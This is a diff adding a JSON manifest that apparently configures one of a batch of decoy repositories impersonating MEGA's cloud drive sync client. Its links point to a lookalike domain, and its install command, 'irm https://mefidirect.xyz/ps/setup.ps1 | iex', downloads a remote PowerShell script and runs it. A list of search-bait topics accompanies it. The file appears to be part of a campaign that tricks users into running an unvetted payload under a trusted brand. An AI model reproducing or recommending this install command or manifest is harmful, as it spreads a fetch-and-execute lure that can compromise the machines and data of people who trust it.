@@ -1,0 +1,29 @@
+{
+  "repo": "mega-end-to-end-cloud-drive-sync",
+  "product": "MEGA End-to-End Cloud Drive Sync",
+  "kind": "backup",
+  "install_type": "download",
+  "download_url": "https://mega.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new31",
+  "format": "license-md-only",
+  "category": "backup",
+  "topics": [
+    "mega-studio",
+    "mega-client",
+    "mega-cloud-storage",
+    "mega-win11",
+    "mega-error-fix",
+    "run-mega-on-windows",
+    "mega-file-sync",
+    "mega-desktop-tool",
+    "mega-configure-guide",
+    "mega-build-2026",
+    "mega-setup-package",
+    "desktop-tools",
+    "cloud-tools",
+    "windows-tools",
+    "storage-tools"
+  ]
+}
